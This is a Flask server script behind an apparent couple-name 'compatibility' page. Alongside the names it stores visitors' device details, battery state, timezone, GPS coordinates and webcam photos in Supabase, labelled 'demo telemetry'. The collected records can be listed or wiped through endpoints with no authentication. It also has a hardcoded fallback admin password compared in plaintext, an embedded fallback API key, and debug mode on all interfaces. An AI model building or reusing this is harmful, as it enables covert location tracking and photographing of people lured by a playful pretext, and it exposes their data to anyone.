import os
from datetime import datetime
import requests
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder='.', static_url_path='')

SUPABASE_URL = "https://rixjkiebspsjvdnmmpvp.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_wpKFc1qzlSGrJ03HqeKTdw_wq435ith")

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation"
}

def get_admin_password():
    try:
        res = requests.get(f"{SUPABASE_URL}/rest/v1/admin_auth?id=eq.1&select=password", headers=HEADERS)
        if res.status_code == 200 and res.json():
            return res.json()[0].get('password', 'admin$123')
        else:
            print(f"Supabase Admin Auth Error ({res.status_code}): {res.text}")
    except Exception as e:
        print("Exception fetching admin password:", e)
    return 'admin$123'

def set_admin_password(new_pass):
    try:
        res = requests.patch(
            f"{SUPABASE_URL}/rest/v1/admin_auth?id=eq.1",
            headers=HEADERS,
            json={"password": new_pass}
        )
        if res.status_code not in [200, 204]:
            print(f"Supabase Password Update Error ({res.status_code}): {res.text}")
    except Exception as e:
        print("Error updating password:", e)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.get_json() or {}
    password = data.get('password', '')
    if password == get_admin_password():
        return jsonify({'success': True, 'message': 'Authenticated successfully'})
    return jsonify({'success': False, 'error': 'Incorrect admin password'}), 401

@app.route('/api/admin/change-password', methods=['POST'])
def change_password():
    data = request.get_json() or {}
    old_password = data.get('old_password', '')
    new_password = data.get('new_password', '').strip()

    if not old_password or not new_password:
        return jsonify({'success': False, 'error': 'Both old and new passwords are required'}), 400

    if old_password != get_admin_password():
        return jsonify({'success': False, 'error': 'Old password is incorrect'}), 401

    if len(new_password) < 4:
        return jsonify({'success': False, 'error': 'New password must be at least 4 characters'}), 400

    set_admin_password(new_password)
    return jsonify({'success': True, 'message': 'Admin password updated successfully'})

@app.route('/api/records', methods=['GET'])
@app.route('/api/entries', methods=['GET'])
def get_records():
    try:
        res = requests.get(
            f"{SUPABASE_URL}/rest/v1/demo_telemetry?select=*&order=id.desc",
            headers=HEADERS
        )
        if res.status_code == 200:
            records = res.json()
            return jsonify({'success': True, 'count': len(records), 'records': records})
        else:
            print(f"Supabase GET Records Error ({res.status_code}): {res.text}")
            return jsonify({'success': False, 'error': res.text}), res.status_code
    except Exception as e:
        print("Exception in get_records:", e)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/telemetry', methods=['POST'])
@app.route('/api/report', methods=['POST'])
@app.route('/api/entries', methods=['POST'])
def save_telemetry():
    data = request.get_json() or {}
    your_name = data.get('your_name', '').strip()
    partner_name = data.get('partner_name', '').strip()
    couple_names = data.get('couple_names', '').strip()

    resolved_names = couple_names or (f"{your_name} ❤ {partner_name}" if (your_name and partner_name) else "Demo Participant")
    timestamp = datetime.utcnow().isoformat() + 'Z'

    payload = {
        "timestamp": timestamp,
        "couple_names": resolved_names,
        "device_name": data.get('device_name', 'Generic Device'),
        "device_type": data.get('device_type', 'desktop'),
        "browser": data.get('browser', 'Unknown Browser'),
        "os": data.get('os', 'Unknown OS'),
        "battery_level": data.get('battery_level'),
        "battery_charging": 1 if data.get('battery_charging') is True else (0 if data.get('battery_charging') is False else None),
        "screen_res": data.get('screen_res') or 'Unknown',
        "timezone": data.get('timezone', 'Unknown'),
        "user_agent": data.get('raw_user_agent') or data.get('user_agent', ''),
        "latitude": data.get('latitude'),
        "longitude": data.get('longitude'),
        "location_status": data.get('location_status', 'Not Requested'),
        "camera_status": data.get('camera_status', 'Not Requested'),
        "webcam_pic": data.get('webcam_pic')
    }

    try:
        res = requests.post(
            f"{SUPABASE_URL}/rest/v1/demo_telemetry",
            headers=HEADERS,
            json=payload
        )
        if res.status_code in [200, 201]:
            result_data = res.json()
            new_id = result_data[0].get('id') if isinstance(result_data, list) and result_data else 1
            return jsonify({'success': True, 'id': new_id, 'message': 'Demo telemetry stored in Supabase'}), 201
        else:
            print(f"Supabase POST Telemetry Error ({res.status_code}): {res.text}")
            return jsonify({'success': False, 'error': res.text}), res.status_code
    except Exception as e:
        print("Exception in save_telemetry:", e)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/clear', methods=['POST'])
def clear_records():
    try:
        res = requests.delete(
            f"{SUPABASE_URL}/rest/v1/demo_telemetry?id=gt.0",
            headers=HEADERS
        )
        if res.status_code in [200, 204]:
            return jsonify({'success': True, 'message': 'All telemetry records cleared successfully'})
        else:
            print(f"Supabase DELETE Error ({res.status_code}): {res.text}")
            return jsonify({'success': False, 'error': res.text}), res.status_code
    except Exception as e:
        print("Exception in clear_records:", e)
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Flask server running on http://127.0.0.1:{port} connected to Supabase")
    app.run(host='0.0.0.0', port=port, debug=True)
